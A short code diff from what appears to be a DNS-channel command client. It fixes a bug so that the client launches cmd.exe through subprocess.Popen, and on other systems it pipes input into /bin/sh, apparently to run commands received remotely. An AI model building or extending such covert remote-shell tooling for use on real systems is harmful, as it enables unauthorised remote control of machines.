@@ -91,7 +91,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                             'startupinfo': startupinfo,
                         })
 
-                    pipe = subprocess.Pipe('cmd.exe', **kwargs)
+                    pipe = subprocess.Popen('cmd.exe', **kwargs)
                 else:
                     pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)
 
